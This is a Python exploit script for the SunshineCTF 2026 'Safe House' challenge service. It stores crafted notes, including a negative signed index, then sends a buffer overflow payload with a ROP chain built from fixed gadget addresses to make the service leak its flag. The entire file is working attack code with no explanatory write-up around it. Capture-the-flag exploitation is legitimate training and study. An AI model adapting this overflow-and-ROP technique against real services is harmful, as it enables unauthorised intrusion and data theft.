#!/usr/bin/env python3
"""Exploit the SunshineCTF 2026 Safe House service."""

import argparse
import re
import socket
import struct
import sys

DEFAULT_HOST = "chal.sunshinectf.games"
DEFAULT_PORT = 26007

# Fixed addresses from challenge/service (non-PIE x86-64 ELF).
POP_RDI = 0x401529
POP_RSI = 0x401DD5
RET = 0x40152A
RELAY = 0x401F70
SEND_FRAME = 0x401D50
EXIT = 0x401180

# The NOTE table and its 64-byte entries are in the binary's .bss.
NOTE0 = 0x40A180
NOTE1 = 0x40A1C0
NOTE2 = 0x40A200
RETURN_OFFSET = 0x48


class SocketReader:
    def __init__(self, sock):
        self.sock = sock
        self.buffer = bytearray()

    def until(self, marker):
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise RuntimeError("connection closed before expected prompt")
            self.buffer.extend(chunk)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def rest(self):
        chunks = [bytes(self.buffer)]
        self.buffer.clear()
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def pack_words(words):
    return b"".join(struct.pack("<Q", word) for word in words)


def build_payload():
    # First call RELAY with 255. Its error path leaves rdx=11 after write().
    # Then send a type-3 request containing the signed index -4, and use RELAY
    # operation 1 to print the response already queued by the vault.
    chain = [
        POP_RDI, NOTE2, RET, RELAY,
        POP_RDI, 3,
        POP_RSI, NOTE0,
        RET, SEND_FRAME,
        POP_RDI, NOTE1,
        RET, RELAY,
        POP_RDI, 0, EXIT,
    ]
    payload = b"A" * RETURN_OFFSET + pack_words(chain)
    if len(payload) > 0xFF:
        raise ValueError("payload does not fit in the SUBMIT read")
    return payload


def send_line(reader, sock, line):
    sock.sendall(line + b"\n")
    response = reader.until(b"sh> ")
    if b"OK\n" not in response:
        raise RuntimeError("service rejected setup command: " + repr(response))


def exploit(host, port, timeout):
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        reader = SocketReader(sock)
        banner = reader.until(b"sh> ")
        if b"SafeHouse v1.0" not in banner:
            raise RuntimeError("unexpected service banner: " + repr(banner))

        # NOTE 0 stores the raw little-endian signed index -4. The following
        # setup notes provide an invalid relay operation and the final op 1.
        send_line(reader, sock, b"NOTE 0 " + struct.pack("<i", -4))
        send_line(reader, sock, b"NOTE 1 1")
        send_line(reader, sock, b"NOTE 2 255")

        sock.sendall(b"SUBMIT 255\n")
        prompt = reader.until(b"GO\n")
        if not prompt.endswith(b"GO\n"):
            raise RuntimeError("SUBMIT did not enter data mode: " + repr(prompt))

        sock.sendall(build_payload())
        output = reader.rest()

    match = re.search(rb"sun\{[^}\r\n]+\}", output)
    if not match:
        sys.stdout.buffer.write(output)
        raise RuntimeError("flag was not present in the service response")
    return match.group(0).decode("ascii")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    try:
        print(exploit(args.host, args.port, args.timeout))
    except (OSError, RuntimeError, ValueError) as exc:
        parser.exit(1, f"error: {exc}\n")


if __name__ == "__main__":
    main()